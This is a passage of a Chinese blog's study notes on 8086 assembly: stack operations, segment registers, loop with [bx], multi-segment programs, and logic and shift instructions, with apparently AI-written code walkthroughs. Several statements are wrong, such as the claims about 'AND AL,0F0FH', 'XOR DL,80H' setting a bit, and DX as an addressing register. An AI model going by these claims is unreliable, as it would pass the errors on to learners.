<li>push指令的执行步骤：①sp&#x3D;sp-2 ②向ss:sp指向的字单元中送入数据</li>
<li>pop指令的执行步骤：①从ss：sp指向的字单元中读取数据②sp&#x3D;sp+2</li>
<li>任意时刻，ss：sp指向栈顶元素</li>
<li>CPU只记录栈顶，栈空间的大小由我们自己管理</li>
<li>用栈来暂存以后需要恢复的寄存器的内容时，寄存器出栈的顺序要和入栈的相反</li>
<li>push，pop实质是一种内存传送指令，注意他们灵活使用</li>
</ol>
<p><strong>总结：栈是一种非常重要的机制，一定要深入理解，灵活掌握</strong></p>
</blockquote>
<h2 id="3-9-段的综述"><a href="#3-9-段的综述" class="headerlink" title="3.9.段的综述"></a>3.9.段的综述</h2><blockquote>
<p>我们可以将一段内存定义为一个段，用一个段地址指示段，用偏移地址访问段内的单元</p>
<p>我们用一个段存放数据，可以定义为 <strong>数据段</strong></p>
<p>我们用一个段存放代码，可以定义为 <strong>代码段</strong></p>
<p>我们用一个段当作栈，可以定义为 <strong>栈段</strong></p>
<p><strong>数据段</strong>：将段地址存放在DS中</p>
<p><strong>代码段</strong>：将它们的段地址存放在CS中，将段中的第一条指令的偏移地址存放在IP中，这样CPU就将执行我们定义的代码段中的指令</p>
<p><strong>栈段</strong>：段地址存放在SS中，将栈顶单元的偏移地址存放在SP中</p>
</blockquote>
<h1 id="4-第一个程序"><a href="#4-第一个程序" class="headerlink" title="4.第一个程序"></a>4.第一个程序</h1><h2 id="4-1-一个源程序从写出到执行的过程"><a href="#4-1-一个源程序从写出到执行的过程" class="headerlink" title="4.1.一个源程序从写出到执行的过程"></a>4.1.一个源程序从写出到执行的过程</h2><ul>
<li>第一步：编写汇编程序</li>
<li>第二步：对源程序进行编译连接</li>
<li>第三步：执行可执行文件中的程序</li>
</ul>
<h2 id="4-2-源程序"><a href="#4-2-源程序" class="headerlink" title="4.2.源程序"></a>4.2.源程序</h2><blockquote>
<p>汇编语言中包含两种指令：<strong>汇编指令</strong>和 <strong>伪指令</strong></p>
<ul>
<li>汇编指令：有对应机器码的指令，最终被CPU执行</li>
<li>伪指令：由编译器进行执行，进行相关的编译动作</li>
</ul>
</blockquote>
<p><strong>伪指令：</strong></p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604027358862.png" alt="1604027358862"></p>
<p><strong>源程序中的程序</strong></p>
<p>将源程序文件中所有内容称之为源程序，然后通过编译连接后转变为机器码，存储在可执行文件中</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604027748325.png" alt="1604027748325"></p>
<p><strong>标号</strong></p>
<p>一个标号指代了一个地址，作为一个段的名称，这个段的名称最终会编译一个段的段地址。</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604028015173.png" alt="1604028015173"></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00H</span><br><span class="line">int 21H			;执行4c号功能，程序返回功能</span><br></pre></td></tr></table></figure></div>

<h1 id="5-BX-和loop指令"><a href="#5-BX-和loop指令" class="headerlink" title="5.[BX]和loop指令"></a>5.[BX]和loop指令</h1><h2 id="5-1-bx"><a href="#5-1-bx" class="headerlink" title="5.1.[bx]"></a>5.1.[bx]</h2><blockquote>
<p>mov ax,[bx]</p>
<p>说明：bx中存放的数据作为一个偏移地址EA，段地址SA默认在DS中，将SA:EA处的数据送到ax中</p>
<p>mov [bx],ax</p>
<p>说明：bx中存放的数据作为要给偏移地址EA，段地址默认在DS中，将ax中的数据送入到内存中</p>
</blockquote>
<h2 id="5-2-Loop指令"><a href="#5-2-Loop指令" class="headerlink" title="5.2.Loop指令"></a>5.2.Loop指令</h2><p>就是循环指令,它会减少CX的值并检查是否为0，如果不为0则跳转回标签继续循环。</p>
<h2 id="5-3-Loop指令和-bx-使用"><a href="#5-3-Loop指令和-bx-使用" class="headerlink" title="5.3.Loop指令和[bx]使用"></a>5.3.Loop指令和[bx]使用</h2><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604544565226.png" alt="1604544565226"></p>
<blockquote>
<p>这段汇编语言代码主要实现了一个简单的功能，即计算从内存中某个地址开始的12个字节数据之和，并最终通过DOS中断调用返回到操作系统。</p>
<p>下面是详细的分析和解释：</p>
<ol>
<li><p><strong>段定义</strong>:</p>
<ul>
<li><strong><code>assume cs:code</code></strong> 命令告诉汇编器代码将位于名为**<code>code</code>**的代码段中。</li>
<li><strong><code>code segment</code></strong> 和 <strong><code>code ends</code></strong> 之间的内容定义了实际的代码段。</li>
</ul>
</li>
<li><p><strong>初始化寄存器</strong>:</p>
<ul>
<li>**<code>mov ax,0fffH</code>**将十六进制数0fffH送入AX寄存器。通常，这是为了设置DS（数据段）寄存器以指向内存中的某个数据段，但此处的值似乎用于演示目的，实际上可能会导致访问内存错误，因为0fffH对于大多数程序来说不是一个有效的段地址。</li>
<li><strong><code>mov ds,ax</code></strong> 将AX的内容送入DS寄存器，设定数据段的基地址。</li>
<li><strong><code>mov bx,0</code></strong> 初始化BX为0，BX将作为偏移地址来访问内存中的数据。</li>
<li><strong><code>mov dx,0</code></strong> 初始化DX为0，DX将用来累加数据之和。</li>
<li><strong><code>mov cx,12</code></strong> <u>初始化CX为12，CX将作为循环计数器，控制循环执行12次。</u></li>
</ul>
</li>
<li><p><strong>循环求和</strong>:</p>
<ul>
<li><strong><code>s:</code></strong> 标签定义了一个循环开始的位置。</li>
<li><strong><code>mov al,[bx]</code></strong> 将BX寄存器指向的内存单元中的字节数据加载到AL寄存器中。</li>
<li><strong><code>mov ah,0</code></strong> 清零AH寄存器，确保AL中的字节数据在后续操作中被视为无符号数。</li>
<li><strong><code>add dx,ax</code></strong> 将AX寄存器的内容（此时为AL中的数据加上AH中的0）加到DX中，累计总和。</li>
<li><strong><code>inc bx</code></strong> 将BX的值增加1，以便下一次循环读取下一个字节。</li>
<li><strong><code>loop s</code></strong> 是一个循环指令，它会减少CX的值并检查是否为0，如果不为0则跳转回标签<code>s</code>继续循环。</li>
</ul>
</li>
<li><p><strong>退出程序</strong>:</p>
<ul>
<li><code>mov ax,4C00H</code> 将4C00H送入AX寄存器，这是DOS中断21H的功能号，用于请求程序终止并返回到操作系统，其中4CH表示退出程序，00H是返回给操作系统的错误码，通常表示正常退出。</li>
<li><code>int 21H</code> 执行DOS中断调用，结束程序。</li>
</ul>
</li>
</ol>
<p>注意：此代码中的DS段寄存器设置为0fffH，这在实际应用中很可能会导致访问冲突或错误，除非程序在特定的内存布局中运行，该布局中0fffH是合法且预期的数据段起始地址。在常规的实模式DOS程序中，数据段地址应由程序加载时正确设置，通常不会直接设置为这么高的地址。</p>
</blockquote>
<h2 id="5-4-段前缀"><a href="#5-4-段前缀" class="headerlink" title="5.4.段前缀"></a>5.4.段前缀</h2><ul>
<li><code>mov ax,ds:[bx]</code>:将一个内存单元的内容送入ax中，这个内存单元存放两个字节，偏移地址在<code>bx</code>中，段地址在<code>ds</code>中</li>
<li><code>mov  ax,cs:[bx]</code>,<code>mov ax,es:[bx]</code>,<code>mov ax,ss:[0]</code>,<code>mov ax,cs:[0]</code></li>
</ul>
<p>这些出现在访问内存单元的指令中，用于显示的指明内存单元的段地址的<code>ds</code>:,<code>cs:</code>,<code>ss:</code>,<code>es:</code>,我们称之为段前缀</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">段寄存器:CS、DS、ES、SS</span><br><span class="line">代码段：CS 比如：IP执行地址都是CS代码段的内容</span><br><span class="line">数据段：DS 比如：如mov ax,[bx]间接寻址法所指的都是数据段的数据</span><br><span class="line">堆栈段：SS 比如：SP堆栈数据、BP基指针，都是指堆栈段的</span><br><span class="line">附加段：ES 比如：mov ax,es:[di] 利用间接寻址法取ES段的数据</span><br></pre></td></tr></table></figure></div>

<h2 id="5-5-一段安全的段空间"><a href="#5-5-一段安全的段空间" class="headerlink" title="5.5.一段安全的段空间"></a>5.5.一段安全的段空间</h2><p><code>0:200~0:2ff</code>的256字节空间，这个段空间是安全的</p>
<h1 id="6-包含多个段的程序"><a href="#6-包含多个段的程序" class="headerlink" title="6.包含多个段的程序"></a>6.包含多个段的程序</h1><h2 id="6-1-在代码段中使用数据"><a href="#6-1-在代码段中使用数据" class="headerlink" title="6.1.在代码段中使用数据"></a>6.1.在代码段中使用数据</h2><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604557474529.png" alt="1604557474529"></p>
<p>**dw含义:**全称<code>define word</code>,在这里定义了8个字型数据，它们所占的内存空间大小为16字节</p>
<blockquote>
<p>程序中的指令需要对这8个数据进行累加，8个数据放在哪里呢？</p>
<p>答：程序在运行的时候CS中存放代码段的的段地址。dw定义的数据处于代码段的最开始，所以偏移地址为0，这8个数据在代码段的偏移0，2，4，6，8，A，C，E处。</p>
</blockquote>
<p><strong>ends start</strong>:指明程序的入口，被转化为一个入口地址</p>
<blockquote>
<p>这段汇编语言代码的功能是累加一组双字节（word）数据，并存储结果在寄存器AX中。下面是详细的代码分析：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code</span><br></pre></td></tr></table></figure></div>
<p>这一行声明段寄存器CS指向名为<code>code</code>的段。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">code segment</span><br><span class="line">dw  0123h, 0456h, 0789h, 0abch, 0defh, 0fedh, 0cbah, 0987h</span><br></pre></td></tr></table></figure></div>
<p>定义了一个名为<code>code</code>的段，在这个段中存放了8个双字节（word）的数据：0123h, 0456h, … , 0987h。这些数据以双字节为单位连续存储在内存中，每两个数据之间默认间隔一个字节地址（因为每个数据占2字节）。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">start:  mov bx,0</span><br><span class="line">mov ax,0</span><br><span class="line">mov cx,8</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>start:</code> 标记了程序的起始执行点。</li>
<li><code>mov bx,0</code> 初始化基址寄存器BX为0，BX将用来作为数据数组的指针。</li>
<li><code>mov ax,0</code> 将累加和的寄存器AX清零，用于存放最终的累加结果。</li>
<li><code>mov cx,8</code> 初始化计数寄存器CX为8，表示循环将执行8次，对应于数据数组中的8个元素。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">s:   </span><br><span class="line">add ax,[bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure></div>
<p>这是一个循环结构，用以累加数据段中的所有数据：</p>
<ul>
<li><code>s:</code> 是循环的标签。</li>
<li><code>add ax,[bx]</code> 将BX指向的内存单元中的数据（当前元素）加到AX中，实现累加操作。</li>
<li><code>add bx,2</code> 每次循环后，BX增加2，这是因为每个数据项是双字节（word），即2个字节，所以要跳过当前数据到下一个数据。</li>
<li><code>loop s</code> 是循环控制指令，它会自动将CX的值减1，如果CX不为0，则跳转回标签<code>s</code>继续执行循环，直到CX减到0为止，此时循环结束。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure></div>

<p>最后，使用DOS中断21h的服务号4Ch来结束程序，返回操作系统，其中AX寄存器的低字节00h表示程序正常退出。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure></div>
<ul>
<li><code>code ends</code> 表示<code>code</code>段定义结束。</li>
<li><code>end start</code> 指定程序的入口点为<code>start</code>，同时告知汇编器程序汇编结束。</li>
</ul>
<p>综上所述，这段代码的作用是从内存中预先设定的一组双字节数据（0123h至0987h）开始，将这些数据累加起来，并将累加的结果存储在AX寄存器中。</p>
</blockquote>
<h2 id="6-2-在代码段中使用栈"><a href="#6-2-在代码段中使用栈" class="headerlink" title="6.2.在代码段中使用栈"></a>6.2.在代码段中使用栈</h2><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604563764138.png" alt="1604563764138"></p>
<p><strong>对于sp的理解:</strong></p>
<p>第一步：看计算机系统内存：</p>
<p>SA:10: 23 12 56 04 ……….09              16个字节</p>
<p>SA:20:0…………………………..0              对应 第二个dw:00000000</p>
<p>SA:30:0…………………………..0               对应 第二个dw:00000000</p>
<blockquote>
<p>这段汇编代码完成了一个特定的任务，即通过堆栈在代码段中移动一个16字节数据块。具体分析如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume code</span><br><span class="line">code segment</span><br><span class="line">dw 0123h,0456h,0789h, 0abch, 0defh, 0fedh, 0cbah, 0987h</span><br><span class="line">dw 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0</span><br></pre></td></tr></table></figure></div>
<p>首先，定义了两组双字节（word）数据。前8个是非零数据，后16个初始化为0。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">start: mov ax,cs</span><br><span class="line">       mov  ss,ax</span><br><span class="line">       mov  sp,30h</span><br></pre></td></tr></table></figure></div>
<p>这部分代码设置了堆栈段（SS）与代码段（CS）相同，并将堆栈指针（SP）设置为30h，意味着堆栈从地址CS:30h开始向下增长，预留了一定的空间用于存储数据。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">       mov bx,0</span><br><span class="line">       mov cx,8</span><br><span class="line">s:     push cs:[bx]</span><br><span class="line">       add bx,2</span><br><span class="line">       loop s</span><br></pre></td></tr></table></figure></div>
<p>这里开始一个循环，将前8个非零数据通过<code>push</code>指令压入堆栈。<code>cs:[bx]</code>访问的是代码段中的数据，从偏移量BX开始的双字节。每次循环，BX增加2，指向下一个数据，总共循环8次，将所有非零数据压栈。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">       mov bx,0</span><br><span class="line">       mov cx,8</span><br><span class="line">s0:    pop cs:[bx]</span><br><span class="line">       add bx,2</span><br><span class="line">       loop s0</span><br></pre></td></tr></table></figure></div>
<p>接着，进行第二个循环<code>s0</code>，这次是从堆栈中弹出数据并存回到代码段中原来初始化为0的部分。同样循环8次，每次<code>pop</code>后，BX增加2，确保数据被正确地放置到代码段的对应位置。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure></div>
<p>最后，使用DOS中断21h的服务号4Ch来结束程序，返回操作系统，其中AX寄存器的低字节00h表示程序正常退出。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">code ends</span><br><span class="line">end</span><br></pre></td></tr></table></figure></div>
<p>标记代码段结束，并告知汇编器程序的结尾。</p>
<p>总结来说，这段代码通过堆栈实现了代码段内部的数据搬移，具体是从一段非零数据移到另一段初始为0的数据区域，展示了汇编语言中堆栈操作和循环控制的应用。</p>
</blockquote>
<h2 id="6-3-将数据、代码、栈放入到不同的段"><a href="#6-3-将数据、代码、栈放入到不同的段" class="headerlink" title="6.3.将数据、代码、栈放入到不同的段"></a>6.3.将数据、代码、栈放入到不同的段</h2><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604564239260.png" alt="1604564239260"></p>
<p><strong>对于sp的理解</strong></p>
<p>c 等于开辟了一块空间，在这段空间中</p>
<p>SA:0:00000000</p>
<p>SA:10:000000000</p>
<p>然后就sp 就指向了20h</p>
<blockquote>
<p>这段汇编代码演示了如何在不同的段之间移动数据，具体是从数据段A到堆栈段C，然后又从堆栈段C返回到另一个位置在数据段A中。以下是详细分析：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:b,ds:a,ss:c</span><br></pre></td></tr></table></figure></div>
<p>这一行指定了代码段寄存器CS指向段b，数据段寄存器DS指向段a，堆栈段寄存器SS指向段c。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">a segment</span><br><span class="line">dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h</span><br><span class="line">a ends</span><br></pre></td></tr></table></figure></div>
<p>段a定义了8个双字节（word）的数据，这是原始数据集合。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">c segment</span><br><span class="line">dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0</span><br><span class="line">c ends</span><br></pre></td></tr></table></figure></div>
<p>段c定义了16个双字节的空数据空间，准备用于临时存储从段a中移动过来的数据。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">b segment</span><br><span class="line">d:     mov ax,c</span><br><span class="line">mov ss,ax</span><br><span class="line">mov sp,20h</span><br></pre></td></tr></table></figure></div>
<ul>
<li>这段代码位于代码段b中，从标号d开始执行。</li>
<li>首先，将段c的段地址加载到AX寄存器中，然后将AX的内容赋给SS，设置堆栈段指向段c。</li>
<li>接着，设置堆栈指针SP为20h，这意味着堆栈将从段c的地址20h处开始向下增长。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,a</span><br><span class="line">mov ds,ax</span><br><span class="line">mov bx,0</span><br><span class="line">mov cx,8</span><br><span class="line">s:      push [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s</span><br></pre></td></tr></table></figure></div>
<ul>
<li>将段a的段地址加载到AX，再将AX赋给DS，使得数据段寄存器指向段a。</li>
<li>初始化BX为0，CX为8，用于后续循环操作。</li>
<li>进入循环s，将段a中由BX指向的数据通过<code>push</code>指令压入堆栈，之后BX加2指向下一个数据，使用<code>loop s</code>循环直到CX减到0。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov bx,0</span><br><span class="line">mov cx,8</span><br><span class="line">s0:    pop [bx]</span><br><span class="line">add bx,2</span><br><span class="line">loop s0</span><br></pre></td></tr></table></figure></div>
<ul>
<li>重置BX为0，CX为8，开始另一个循环s0。</li>
<li>在此循环中，从堆栈中弹出数据到段a中新的位置（之前清零的16个位置的前8个），BX每次加2指向下一个目标地址，直至循环结束。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov ax,4c00h</span><br><span class="line">int 21h</span><br></pre></td></tr></table></figure></div>
<ul>
<li>最后，设置AX为4C00h，调用DOS中断21h来结束程序。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">b ends</span><br><span class="line">end   d</span><br></pre></td></tr></table></figure></div>
<ul>
<li><strong><u>标记代码段b的结束，并告知汇编器程序的起始标签为d。</u></strong></li>
</ul>
<p>综上所述，这段代码首先设置好段寄存器以指向正确的段，然后通过堆栈机制，将段a中前8个双字节数据复制到段c中暂存，随后立即从段c中将这些数据弹出并覆盖段a中另一块预先清零的区域，完成了一次数据在段内的“转移”操作，并最终结束程序。</p>
</blockquote>
<h1 id="7-更灵活的定位内存地址的方法"><a href="#7-更灵活的定位内存地址的方法" class="headerlink" title="7.更灵活的定位内存地址的方法"></a>7.更灵活的定位内存地址的方法</h1><h2 id="7-1-and-和-or-指令、xor和not指令"><a href="#7-1-and-和-or-指令、xor和not指令" class="headerlink" title="7.1.and 和 or 指令、xor和not指令"></a>7.1.and 和 or 指令、xor和not指令</h2><blockquote>
<p><strong>and 指令：只有全为1，才为1</strong></p>
<p>mov al，01100011B</p>
<p>and  al,   00111011B</p>
<p><strong>or 指令：只用全为0，才为0</strong></p>
<p>or  al,   00111011B</p>
<p>xor cx,cx  			;CX清零，同时清除进位标志</p>
<p>AND  AX,AX		 ;自身相与值不变，该语句常用于清进位标志</p>
<p>AND AL,0FH		;分离出AL中低四位，高四位被清0</p>
<p>AND AL,0F0FH	;分离出AL中高四位，低四位被清0</p>
<p>XOR DL,80H		 ;DL中最高位置1</p>
<blockquote>
<p>总结</p>
<ul>
<li>NOT指令对标志位没有影响</li>
<li>执行除NOT指令外的逻辑指令后，OF和CF两个标志都被清0，而AF的状态不确定，其他标志反应操作结果的状态。</li>
<li>TEST指令对两个操作数进行“与”操作，但是不保留“与”的结果，只是通过标志状态的判断，得出测试结果。</li>
</ul>
</blockquote>
</blockquote>
<h2 id="7-2-位移和循环位移"><a href="#7-2-位移和循环位移" class="headerlink" title="7.2.位移和循环位移"></a>7.2.位移和循环位移</h2><blockquote>
<p><strong>非循环移位指令：</strong></p>
<p>SAL　　——　　算术左移　　——　　最高位移入标志状态位CF，最低位补0</p>
<p>SAR　　——　　算术右移　　——　　最低位移入CF，最高位不变，最高位原来是1，右移过后最高位就补1</p>
<p>比如说：将10000000算术右移7位，应该变成11111111，而逻辑右移7位，则不考虑符号位，变为00000001</p>
<p>SHL　　——　　逻辑左移　　——　　最高位移入标志状态位CF，最低位补0</p>
<p>SHR　　——　　逻辑右移　　——　　最低位移入CF，最高位补0</p>
<p><strong>循环移位指令：</strong></p>
<p>ROL　　——　　循环左移　　——　　不带进位位的循环左移，最高位移入CF和最低位</p>
<p>ROR　　——　　循环右移　　——　　不带进位位的循环右移，最低位移入CF和最高位</p>
<p>RCL　　——　　带进位的循环左移　　——　　带进位位的循环左移，最高位移入CF，原来的CF进入最低位</p>
<p>RCR　　——　　带进位的循环右移　　——　　带进位位的循环右移，最低位移入CF，原来的CF进入最高位</p>
<blockquote>
<p>说明：</p>
<ul>
<li>CF的值总是最后一次被移入的值</li>
<li>位移指令影响标志位CF,OF,SF,ZF。而循环位移指令仅影响CF和OF位。</li>
<li>对OF位的影响：在移动1位的情况下，如果位移后的操作数是最高位改变了，OF就置1，否则置0.若位移次数大于1，那么OF 不确定。</li>
</ul>
</blockquote>
<blockquote>
<p>1、算术左移、逻辑左移</p>
<p>算术左移和逻辑左移一样都是<strong>右边补0</strong></p>
<p>[例] 00101011<br> 算术左移一位:01010110<br> 逻辑左移一位:01010110</p>
<p>2、逻辑右移：将二进制数整体右移，左边补0</p>
<p>[例]10101101逻辑右移一位为01010110</p>
<p>3、算术右移：<strong>符号位</strong>要一起移动，并且在左边补上符号位</p>
<p>[例]11100算术右移一位为11110（符号位1跟着一起移动并且左边补了1）</p>
</blockquote>
</blockquote>
<h2 id="7-3-以字符的形式给出数据"><a href="#7-3-以字符的形式给出数据" class="headerlink" title="7.3.以字符的形式给出数据"></a>7.3.以字符的形式给出数据</h2><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604630532787.png" alt="1604630532787"></p>
<blockquote>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume cs:code,ds:data</span><br></pre></td></tr></table></figure></div>

<p>这一行定义了代码段（CS）和数据段（DS）的段寄存器分别指向名为<code>code</code>和<code>data</code>的段。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">data segment</span><br><span class="line">     db &quot;unIX&quot;</span><br><span class="line">     db &quot;foRK&quot;</span><br><span class="line">   data ends</span><br></pre></td></tr></table></figure></div>

<ul>
<li><code>data segment</code> 定义了数据段的开始。</li>
<li><code>db &quot;unIX&quot;</code> 和 <code>db &quot;foRK&quot;</code> 分别定义了两个字符串常量，每个字符串包含四个字符，存储在数据段中。”unIX” 和 “foRK” 会按顺序占据内存中的位置。</li>
<li><code>data ends</code> 标志数据段的结束。</li>
</ul>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;end start</span><br></pre></td></tr></table></figure></div>

<p>这一行指示汇编器程序的结束，并且指定程序的起始地址为 <code>start</code> 标签所在的位置。</p>
<p>总结：这个程序主要做了两件事情：定义了包含两个字符串的数据段，并在代码段中执行了一些基本的寄存器操作，最后通过调用 DOS 中断21h的4C号功能来结束程序。字符串”unIX”和”foRK”虽然被定义，但在程序中并没有被使用，它们的存在更多是为了演示数据段的定义。</p>
</blockquote>
<h2 id="7-4-bx-idata"><a href="#7-4-bx-idata" class="headerlink" title="7.4. [bx+idata]"></a>7.4. [bx+idata]</h2><p>[bx+idata]表示一个内存单元，它的偏移地址为（bx）+（itda）</p>
<h2 id="7-5-SI和DI"><a href="#7-5-SI和DI" class="headerlink" title="7.5.SI和DI"></a>7.5.SI和DI</h2><p>si 和 di 是与bx 功能相近的寄存器，si 和di 不能够分成两个8为寄存器来使用，下面是3组指令实现了相同的功能</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604630773520.png" alt="1604630773520"></p>
<h2 id="7-6-bx-si-和-bx-di"><a href="#7-6-bx-si-和-bx-di" class="headerlink" title="7.6.[bx + si] 和 [bx + di]"></a>7.6.[bx + si] 和 [bx + di]</h2><h2 id="7-7-bx-si-idata-和-bx-di-idata"><a href="#7-7-bx-si-idata-和-bx-di-idata" class="headerlink" title="7.7.[bx + si + idata] 和 [bx + di + idata]"></a>7.7.[bx + si + idata] 和 [bx + di + idata]</h2><h1 id="8-数据处理的两个基本问题"><a href="#8-数据处理的两个基本问题" class="headerlink" title="8.数据处理的两个基本问题"></a>8.数据处理的两个基本问题</h1><p>定义了两个描述符号：</p>
<ul>
<li>通用寄存器reg包含了：ax，bx，cx，dx，（ah，al，bh，bl，ch，cl，dh，dl），sp，bp，si，di</li>
<li>段寄存器sreg包含了：ds，ss，cs，es</li>
</ul>
<h2 id="8-1-bx，si，di-和bp-基址变址寻址"><a href="#8-1-bx，si，di-和bp-基址变址寻址" class="headerlink" title="8.1.bx，si，di 和bp[基址变址寻址]"></a>8.1.bx，si，di 和bp[基址变址寻址]</h2><blockquote>
<p>只有BX，SI，DI和BP这4 个寄存器可以用于[…]中进行内存单元寻址</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604631336930.png" alt="1604631336930"></p>
<blockquote>
<p>在[…]中，这4个寄存器可以单个出现，或者只能以4中组合出现：bx 和 si，bx 和 di，bp 和si，bp和di，比如下面指令是正确的：</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604631454682.png" alt="1604631454682"></p>
<blockquote>
<p><strong>只要在[…]中使用寄存器bp，而指令中没有显性的给出段地址，段地址就默认在SS中，</strong>比如下面的指令</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604631552612.png" alt="1604631552612"></p>
<h2 id="8-2-汇编语言中数据位置的表达"><a href="#8-2-汇编语言中数据位置的表达" class="headerlink" title="8.2.汇编语言中数据位置的表达"></a>8.2.汇编语言中数据位置的表达</h2><blockquote>
<p>立即数：对于直接包含在机器指令中的数据（执行前在CPU的指令缓冲器中），在汇编语言中称之为立即数，在汇编指令中直接给出</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604631868136.png" alt="1604631868136"></p>
<blockquote>
<p>寄存器：要处理的数据在寄存器中</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604631917384.png" alt="1604631917384"></p>
<h2 id="8-3-段地址和偏移地址"><a href="#8-3-段地址和偏移地址" class="headerlink" title="8.3.段地址和偏移地址"></a>8.3.段地址和偏移地址</h2><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604631953216.png" alt="1604631953216"></p>
<h2 id="8-4-寻址方式"><a href="#8-4-寻址方式" class="headerlink" title="8.4.寻址方式"></a>8.4.寻址方式</h2><p><img lazyload src="/images/loading.svg" data-src="D:/blog/source/_posts/Assembley-language/1604631995576.png" alt="1604631995576"></p>
<blockquote>
<ul>
<li>用BX,DX,SI做间址寄存器寻找操作数时，隐含规定段基址由DS提供</li>
<li>当BP做间址寄存器寻找操作数时，隐含规定段基址由SS提供</li>
</ul>
</blockquote>
<h2 id="8-5-指令要处理的数据有多长"><a href="#8-5-指令要处理的数据有多长" class="headerlink" title="8.5.指令要处理的数据有多长"></a>8.5.指令要处理的数据有多长</h2><blockquote>
<p>使用操作符X ptr 指明内存单元的长度，X 在汇编中可以指定为word 或者 byte</p>
</blockquote>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/1604632157945.png" alt="1604632157945"></p>
<h2 id="8-6-算术运算类指令"><a href="#8-6-算术运算类指令" class="headerlink" title="8.6.算术运算类指令"></a>8.6.算术运算类指令</h2><h3 id="ADD加法指令"><a href="#ADD加法指令" class="headerlink" title="ADD加法指令"></a>ADD加法指令</h3><p>格式：ADD	DEST,	SCR</p>
<p>功能：将源操作数SCR和目的操作数DEST相加，结果存入DEST中</p>
